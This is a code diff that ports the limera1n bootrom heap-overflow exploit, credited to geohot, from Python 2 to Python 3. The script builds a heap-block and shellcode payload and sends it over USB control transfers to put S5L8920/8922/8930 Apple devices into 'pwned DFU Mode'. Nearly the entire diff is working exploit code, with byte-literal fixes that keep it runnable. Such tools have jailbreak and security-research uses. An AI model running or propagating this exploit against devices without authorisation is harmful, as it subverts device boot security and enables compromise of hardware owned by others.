@@ -1,3 +1,4 @@
+#!/Users/CFDA_BOLOGNA/opt/anaconda3/bin/python
 # Credit: This file is based on limera1n exploit (heap overflow) by geohot.
 
 import array, ctypes, struct, sys, time
@@ -142,8 +143,12 @@ def create_control_transfer(device, request, timeout):
 
 def limera1n_libusb1_async_ctrl_transfer(device, bmRequestType, bRequest, wValue, wIndex, data, timeout):
     if usb.backend.libusb1._lib is not device._ctx.backend.lib:
-        print 'ERROR: This exploit requires libusb1 backend, but another backend is being used. Exiting.'
+        print('ERROR: This exploit requires libusb1 backend, but another backend is being used. Exiting.')
         sys.exit(1)
+
+    # Ensure data is bytes
+    if isinstance(data, str):
+        data = data.encode('latin-1')
 
     request = array.array('B', struct.pack('<BBHHH', bmRequestType, bRequest, wValue, wIndex, len(data)) + data)
     transfer_ptr = create_control_transfer(device, request, timeout)
@@ -167,17 +172,17 @@ def generate_payload(constants, exploit_lr):
         assert value == 0xBAD00001 + i
 
     shellcode_address = 0x84000400 + 1
-    heap_block = struct.pack('<4I48s', 0x405, 0x101, shellcode_address, exploit_lr, '\xCC' * 48)
+    heap_block = struct.pack('<4I48s', 0x405, 0x101, shellcode_address, exploit_lr, b'\xCC' * 48)
     return heap_block * 16 + shellcode[:placeholders_offset] + struct.pack('<%sI' % len(constants), *constants)
 
 def exploit():
-    print '*** based on limera1n exploit (heap overflow) by geohot ***'
+    print('*** based on limera1n exploit (heap overflow) by geohot ***')
 
     device = dfu.acquire_device()
-    print 'Found:', device.serial_number
+    print('Found:', device.serial_number)
 
     if 'PWND:[' in device.serial_number:
-        print 'Device is already in pwned DFU Mode. Not executing exploit.'
+        print('Device is already in pwned DFU Mode. Not executing exploit.')
         return
     
     chosenConfig = None
@@ -188,21 +193,23 @@ def exploit():
     if chosenConfig is None:
         for config in configs:
             if 'CPID:%s' % config.cpid in device.serial_number:
-                print 'ERROR: CPID is compatible, but serial number string does not match.'
-                print 'Make sure device is in SecureROM DFU Mode and not LLB/iBSS DFU Mode. Exiting.'
+                print('ERROR: CPID is compatible, but serial number string does not match.')
+                print('Make sure device is in SecureROM DFU Mode and not LLB/iBSS DFU Mode. Exiting.')
                 sys.exit(1)
-        print 'ERROR: Not a compatible device. This exploit is for S5L8920/S5L8922/S5L8930 devices only. Exiting.'
+        print('ERROR: Not a compatible device. This exploit is for S5L8920/S5L8922/S5L8930 devices only. Exiting.')
         sys.exit(1)
     
-    dfu.send_data(device, generate_payload(chosenConfig.constants, chosenConfig.exploit_lr))
+    payload_data = generate_payload(chosenConfig.constants, chosenConfig.exploit_lr)
+    dfu.send_data(device, payload_data)
 
-    assert len(device.ctrl_transfer(0xA1, 1, 0, 0, 1, 1000)) == 1
+    response = device.ctrl_transfer(0xA1, 1, 0, 0, 1, 1000)
+    assert len(response) == 1
 
-    limera1n_libusb1_async_ctrl_transfer(device, 0x21, 1, 0, 0, 'A' * 0x800, 10)
+    limera1n_libusb1_async_ctrl_transfer(device, 0x21, 1, 0, 0, b'A' * 0x800, 10)
 
     try:
         device.ctrl_transfer(0x21, 2, 0, 0, 0, 10)
-        print 'ERROR: This request succeeded, but it should have raised an exception. Exiting.'
+        print('ERROR: This request succeeded, but it should have raised an exception. Exiting.')
         sys.exit(1)
     except usb.core.USBError:
         # OK: This request should have raised USBError.
@@ -222,7 +229,7 @@ def exploit():
     dfu.release_device(device)
 
     if failed:
-        print 'ERROR: Exploit failed. Device did not enter pwned DFU Mode.'
+        print('ERROR: Exploit failed. Device did not enter pwned DFU Mode.')
         sys.exit(1)
 
-    print 'Device is now in pwned DFU Mode.'
+    print('Device is now in pwned DFU Mode.')
